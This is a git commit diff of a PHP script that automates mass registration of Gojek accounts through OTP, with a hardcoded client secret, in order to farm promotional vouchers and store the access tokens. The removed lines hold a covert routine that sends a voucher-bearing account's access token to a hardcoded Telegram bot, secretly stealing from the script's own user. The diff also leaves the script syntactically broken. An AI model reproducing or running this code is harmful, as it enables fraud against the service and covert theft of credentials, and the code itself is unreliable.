da76c61a0e98d196f8aeb958c31371fd097aae8c
coknet <57169925+coknet@users.noreply.github.com>
2020-03-05 16:21:21 +0700

    Update gojek.php

--- gojek.php
+++ gojek.php
@@ -10,15 +10,13 @@ echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";
 function change(){
         $nama = nama();
         $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
-        ulang:
         echo color("nevy","?] Nomor HP : ");
         $no = trim(fgets(STDIN));
         $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
         $register = request("/v5/customers", null, $data);
         if(strpos($register, '"otp_token"')){
         $otptoken = getStr('"otp_token":"','"',$register);
-        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
-        otp:
+        echo color("green","+] Kode verifikasi sudah di kirim")."\n
         echo color("nevy","?] OTP : ");
         $otp = trim(fgets(STDIN));
         $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
@@ -72,99 +70,3 @@ function change(){
 	$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
 	$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
 	$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-                                        $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
-					$chatid = "905644289";
-                                        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
-					$pesan 	= $token;
-					$method	= "sendMessage";
-					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-					$post = [
- 					'chat_id' => $chatid,
- 			        	'text' => $pesan
-					];
-                                        $header = [
-                                        "X-Requested-With: XMLHttpRequest",
-                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
-                                        ];
-                                        $ch = curl_init();
-                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                                        curl_setopt($ch, CURLOPT_URL, $url);
-                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
-                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-                                        $datas = curl_exec($ch);
-                                        $error = curl_error($ch);
-                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-                                        curl_close($ch);
-                                        $debug['text'] = $pesan;
-                                        $debug['respon'] = json_decode($datas, true);
-                                        }
-         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
-         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
-         }else{
-         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
-         }
-         setpin:
-         echo "\n".color("nevy","?] Mau set PIN? : ");
-         $pilih1 = trim(fgets(STDIN));
-         if($pilih1 == "y" && strpos($no, "628")){
-         echo color("red","===============(SET PIN)===============")."\n";
-         $data2 = '{"pin":"112233"}';
-         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
-         echo "OTP set pin : ";
-         $otpsetpin = trim(fgets(STDIN));
-         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;
-         }else if($pilih1 == "n" || $pilih1 == "N"){
-         die();
-         }else{
-         echo color("red","-] Access Denied !\n");
-         }
-         }
-         }
-         }
-         }else{
-         goto setpin;
-         }
-         }else{
-         echo color("red","-] OTP yang anda Masukkan salah");
-         echo"\n==================================\n\n";
-         echo color("yellow","!] Silahkan Masukkan kembali\n");
-         goto otp;
-         }
-         }else{
-         echo "Nomor HP sudah terdaftar";
-         echo "\nCek Info Akun ? (y/n): ";
-         $pilih = trim(fgets(STDIN));
-         if($pilih == "y" || $pilih == "Y"){
-         echo "\n===============Login================\n";
-         echo "Nomor HP : ".$no."\n";
-         $datalogin = '{"phone":"+'.$no.'"}';
-         $login = request('/v4/customers/login_with_phone', null, $datalogin);
-         if(strpos($login, '"login_token"')){
-         echo "Kode verifikasi sudah di kirim";
-         echo "\nOTP : ";
-         $otplogin = trim(fgets(STDIN));
-         $logintoken = getStr('"login_token": "','"',$login);
-         $datalogin1 = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otplogin.'","otp_token":"'.$logintoken.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
-         $veriflogin = request('/v4/customers/login/verify', null, $datalogin1);
-         echo $veriflogin;
-         $token = getStr('"access_token":"','"',$veriflogin);
-         $uuid = getStr('"resource_owner_id":',',',$veriflogin);
-         $data2 = '{"pin":"112233"}';
-         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
-
-         echo "OTP set pin: ";
-         $otpsetpin = trim(fgets(STDIN));
-         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
-         echo $verifotpsetpin;;
-         }else{
-         echo "404 Not Found ! Please Try Again";
-         }
-         }else{
-         echo "\n==============Register==============\n";
-         goto ulang;
-  }
- }
-}
-echo change()."\n"; ?>
